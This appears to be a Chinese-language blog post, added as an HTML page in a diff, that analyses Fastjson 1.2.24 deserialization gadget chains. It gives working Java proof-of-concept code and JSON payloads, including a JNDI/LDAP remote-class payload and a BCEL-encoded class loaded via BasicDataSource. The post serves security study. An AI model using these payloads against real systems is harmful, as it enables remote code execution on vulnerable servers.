@@ -1,0 +1,842 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/bb.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="	#ADD8E6">
+  <meta name="author" content="bxhhf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="学习的过程中对 FastJson 反序列化调用 getter,setter 细节条件又多了些印象 一.前言学习了 Fastjson 基础后先说说原生，和 Fastjson 的反序列化区别  入口点：原生：readObject(),Fastjson：parseObject()&#x2F;parse(),他进行利用的连接点是在 setter&#x2F;特殊的 getter 属性限制条件：原生：受 tr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson -1.2.24">
+<meta property="og:url" content="https://bxhhf.github.io/2025/11/04/yuque-hexo-post/Fastjson%20-1.2.24/index.html">
+<meta property="og:site_name" content="bxhhf">
+<meta property="og:description" content="学习的过程中对 FastJson 反序列化调用 getter,setter 细节条件又多了些印象 一.前言学习了 Fastjson 基础后先说说原生，和 Fastjson 的反序列化区别  入口点：原生：readObject(),Fastjson：parseObject()&#x2F;parse(),他进行利用的连接点是在 setter&#x2F;特殊的 getter 属性限制条件：原生：受 tr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bxhhf.github.io/img/c.png">
+<meta property="article:published_time" content="2025-11-04T02:44:50.000Z">
+<meta property="article:modified_time" content="2025-11-05T12:51:39.471Z">
+<meta property="article:author" content="bxhhf">
+<meta property="article:tag" content="Fastjson">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bxhhf.github.io/img/c.png">
+  
+  
+  
+  <title>Fastjson -1.2.24 - bxhhf</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_3846514_kabxni94auf.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/sign.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"bxhhf.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"enable":true,"app_id":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","app_key":"gbgqDB024hr2I7jmwbO6Mz2a","server_url":"https://an6azuya.lc-cn-n1-shared.com","enable_sync":false,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://registry.npmmirror.com/lxgw-wenkai-screen-web/latest/files/style.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">bxhhf&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/17.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Fastjson -1.2.24"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-04 10:44" pubdate>
+          2025年11月4日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Fastjson -1.2.24</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>学习的过程中对 FastJson 反序列化调用 getter,setter 细节条件又多了些印象</p>
+<h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h1><p>学习了 Fastjson 基础后先说说原生，和 Fastjson 的反序列化区别</p>
+<ol>
+<li>入口点：原生：readObject(),Fastjson：parseObject()&#x2F;parse(),他进行利用的连接点是在 setter&#x2F;特殊的 getter</li>
+<li>属性限制条件：原生：受 transient 修饰的限制。Fastjson: public 修饰&#x2F;有 setter 的私有属性都可以，也不受原生的限制</li>
+<li>实现 serializable：原生：需要，Fastjson 不需要</li>
+</ol>
+<p>相同点：</p>
+<p>攻击的 sink 点：反射命令执行&#x2F;动态类加载</p>
+<h1 id="二-利用链分析"><a href="#二-利用链分析" class="headerlink" title="二.利用链分析"></a>二.利用链分析</h1><h2 id="2-1-出网的情况-结合-JNDI-–JdbcRowSetImpl"><a href="#2-1-出网的情况-结合-JNDI-–JdbcRowSetImpl" class="headerlink" title="2.1 出网的情况(结合 JNDI)–JdbcRowSetImpl"></a>2.1 出网的情况(结合 JNDI)–JdbcRowSetImpl</h2><p><strong>依赖</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;dependency&gt;<br>    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;<br>    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;<br>    &lt;version&gt;4.0.9&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;commons-io&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;<br>    &lt;version&gt;2.5&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;1.2.24&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;commons-codec&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;<br>    &lt;version&gt;1.12&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-利用链分析"><a href="#1-利用链分析" class="headerlink" title="1. 利用链分析"></a>1. 利用链分析</h3><p>这条链子它是相当于 Fastjson+JNDI 注入结合。从调用的开始 FastJson 的 setter 方法，调用到可利用的 sink 点 JdbcRowSetImpl.connect(),该方法调用 lookup，能进行 JNDI 注入。</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761201465216-8868a6be-3339-4644-bd0f-6e026b52f7aa.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面 dataSourceName 不为空，才进行 JNDI 注入，那就要看参数 getDataSourceName()是否可控，并且要传的话就是传的是工厂的位置。跟进发现 dataSource 虽然是私有属性，但有 setter 方法，那么就是可控的。（JdbcRowSetImpl 子类继承的父类 BaseRowSet 的 setter 方法）</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761219957384-cb2ee72b-e5c6-422c-9aa6-eb198f2901f5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761220026552-74371f2e-25eb-4c75-891e-9d82c28a0bbb.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续向上找调用，还是在 JdbcRowSetImpl 类里面就有调用，经过前面的学习，直接就看 setter 方法 setAutoCommit 里面。进行调用了 connect()，参数为 boolean 值。setter 方法继续向上调就往 json 中赋值，反序列化时自动调用 setter 方法<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761220472174-b30c7ab2-c46c-45d1-948e-d074ad1dca71.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-构造"><a href="#2-构造" class="headerlink" title="2.构造"></a>2.构造</h3><p>所以现在就能进行构造了，之前也说过 json 的 key 映射的是 set 后面的内容，value 为对应的方法传参。构造如下：</p>
+<p>使用 yakite 反连，进行 JNDI 注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//setter：sink点进行调用或进行赋值。</span><br>        String s1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/mDCFyUlo\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;<br>        JSONObject  jsonObject= JSON.parseObject(s1);<br>        System.out.println(jsonObject);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761222006790-673a2a18-eaa8-461e-8619-5622a77c71cc.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>tips：</p>
+<ul>
+<li>需要注意的是，AutoCommit 的逻辑依赖于有 DataSourceName。所以字段 DataSourceName 必须在 AutoCommit 字段前面，否则先调 setAutoCommit，进而进入到 connect 里面，不会触发 JNDI。</li>
+</ul>
+</blockquote>
+<p>总结：这条链比较简单，反序列化时检测到@type，将字符串进行 java 解析，调用 setAutoCommit（）进而调用</p>
+<p>connect(),该方法通过 InitialContext.lookup (dataSourceName) 发起 JNDI 查询，加载远程恶意类并执行代码。</p>
+<hr>
+<hr>
+<h2 id="2-2-不出网的情况–BasicDataSource"><a href="#2-2-不出网的情况–BasicDataSource" class="headerlink" title="2.2 不出网的情况–BasicDataSource"></a>2.2 不出网的情况–BasicDataSource</h2><hr>
+<p><strong>添加一个这个依赖</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;dependency&gt;<br>          &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;<br>          &lt;artifactId&gt;tomcat-jdbc&lt;/artifactId&gt;<br>          &lt;version&gt;9.0.20&lt;/version&gt;<br>      &lt;/dependency&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-利用链分析-1"><a href="#1-利用链分析-1" class="headerlink" title="1. 利用链分析"></a>1. 利用链分析</h3><p>危险方法在这里，com.sun.org.apache.bcel.internal.util.ClassLoader，该方法满足条件后创建一个类，从字节码进行类加载，接着找它的用法直到找到 setter 方法。创建类 creatClass 的时候进行了解码 decode,所以构造时要先编码。</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761461000616-70db258e-0a1b-4a1b-9a37-604188f2ab6d.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761463069502-1e933492-9196-4a7b-9a78-4a39063783e1.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>先看该方法的 poc 构造</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.org.apache.bcel.internal.util.ClassLoader();<br><span class="hljs-type">byte</span>[] bytes = convert(<span class="hljs-string">&quot;D:\\Security\\test_deserialize\\Calc.class&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> classLoader.loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + code).newInstance();<br><br><br><br><span class="hljs-comment">//写一个convert</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-type">byte</span>[] convert(String classPath) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(classPath);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)) &#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 缓冲区大小可根据需求调整</span><br>            <span class="hljs-type">int</span> bytesRead;<br>            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>            &#125;<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>接着就看哪个方法能调用跟这个 loadClass，在 tomcat 的一个类 BasicDataSource，有个方法 creatConnectionFactory，当 driverClassName，driverClassLoader 不为空（注意顺序），分别设置为我们编码后的恶意类和刚刚那个类加载器，就调用 forName，进而去调用 loadClass</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761468699795-a13643ed-9e0c-4d6e-a17e-05f43492351c.png" srcset="/img/loading.gif" lazyload></p>
+<p>刚好俩个私有属性都有 setter 方法，可控</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761469119767-99c26598-16d8-4d9e-ab24-93fab4a111b0.png" srcset="/img/loading.gif" lazyload> 构造：</p>
+<blockquote>
+<p>Fastjson 构造的时候,key 值与 set 后面的字段映射，反序列化时调用 setter 方法进行赋值，无需反射赋值。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = convert(<span class="hljs-string">&quot;D:\\Security\\test_deserialize\\Calc.class&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>接下来就该想上找，找谁调用了 creatConnectionFactory</p>
+<p>creatDataSource 调用 createConnectionFactory</p>
+<p>然后一个 getter 方法 getConnection 调用 createDataSource。虽然这个 getter 方法不是特殊的 getter 方法，但用 parseObject()反序列化调用所有的 getter</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761481157849-a64c14b5-3164-4dd9-a335-4ddfeb634fe0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761481105566-e9904f73-fce0-4042-8ca2-258229097182.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-最终构造"><a href="#2-最终构造" class="headerlink" title="2. 最终构造"></a>2. 最终构造</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">       String s1=&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;AutoCommit\&quot;:false,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/mDCFyUlo\&quot;&#125;&quot;;</span><br><span class="hljs-comment">        JSONObject jsonObject= JSON.parseObject(s1);</span><br><span class="hljs-comment">        System.out.println(jsonObject);*/</span><br>        <span class="hljs-type">byte</span>[] bytes = convert(<span class="hljs-string">&quot;D:\\Security\\test_deserialize\\Calc.class&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>       <span class="hljs-comment">// Object o = classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+ code+<span class="hljs-string">&quot;\&quot;,\&quot;DriverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(s));<br><br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-type">byte</span>[] convert(String classPath) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(classPath);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)) &#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br>            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>            &#125;<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>成功弹出</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761484432441-9c1955cc-dd1a-4d05-975b-71a2f715b00b.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2-3-出网的情况–TemplatesImpl"><a href="#2-3-出网的情况–TemplatesImpl" class="headerlink" title="2.3 出网的情况–TemplatesImpl"></a>2.3 出网的情况–TemplatesImpl</h2><p>回看之前 CC3 的时候，危险方法 TemplatesImpl.newInstance 从字节码中动态类加载进行攻击</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761535206342-bb6f80be-a538-4a9f-a259-e8fb678301fd.png" srcset="/img/loading.gif" lazyload></p>
+<p>刚好是一个 getter 方法（getTransletInstance）调用 newInstance，并且这个过程和 CC3 那里非常相似，<strong>_name 不为空，_class 为空</strong>，调用 defineTransletClasses 对_class 进行赋值，该方法中<strong>_tfactory</strong>有涉及到，所以需要它为声明的类型 TransformerFactoryImpl，并且该方法从<strong>_bytecode</strong>字节码中遍历加载类赋值给_class。有三个需要进行构造</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761535469960-e1cc20f9-0bcf-45db-a498-e847c306b99f.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761638053095-8ede7a94-51be-4f6b-81cf-005c71e6012c.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1762091358888-4f614642-b09c-498c-98a3-ae449ebd00fd.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是这里调用 getTransletInstance 有一个问题，这个 getter 返回类型并不满足，反序列化的时候调不到，继续往上找</p>
+<p>找到方法 getOutputProperties ，返回类型 Properties 继承 Map 所以反序列化能调它，找到了利用链的开头<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761645257225-fc0d95c0-9525-49eb-a636-04b74c31b174.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><font style="color:rgba(0, 0, 0, 0.85);">我在_tfactory 这里想了半天他在那里赋值，因为上面说私有属性_factory 它赋为 TransformerFactoryImpl，但它只有 getter 没有 setter———&gt;反序列化的时候用 parseObject(s,Feature.SupportNonPublicField）它第二个参数为Feature.SupportNonPublicField主要</font>用于反序列化非公有字段且无对应公有 <code>setter</code><font style="color:rgba(0, 0, 0, 0.85);"> ， 反射机制能突破访问权限，直接对非公有字段进行赋值。</font></p>
+<p>构造的时候这样写 ,并不是说给它赋值为空，fastjson 会把 {}解析成声明类型的对象实例，即 TransformerFactoryImpl 实例。包括上面的_bytecode,_OutputProperties 都是这样子赋值的</p>
